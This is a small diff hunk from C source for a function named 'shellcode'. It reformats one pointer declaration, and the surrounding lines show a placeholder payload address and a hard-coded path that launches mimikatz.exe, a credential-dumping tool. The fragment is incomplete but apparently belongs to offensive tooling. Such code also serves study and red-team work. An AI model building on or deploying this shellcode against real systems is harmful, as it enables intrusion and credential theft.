@@ -49,7 +49,7 @@ int __stdcall shellcode(void)
                                  '0','0','0','0','0','0','0','0','0','0','0','0','0',
                                  '0','0','0','0','0','0','0','0','0','0','0','0','0',
                                };
-    BYTE * lpPayloadBuffer = 0xeeeeeeeeffffffff;
+    BYTE* lpPayloadBuffer = 0xeeeeeeeeffffffff;
     DWORD STATUS_SUCCESS = 0;
     WCHAR payload[] = { 'C',':','\\','u','s','e','r','s','\\','w','v','b','o','x','\\','d','e','s','k','t','o','p','\\','m','i','m','i','k','a','t','z','.','e','x','e','\0' };
     WCHAR directory[] = { 'C',':','\\','w','i','n','d','o','w','s','\\','s','y','s','t','e','m','3','2','\0' };
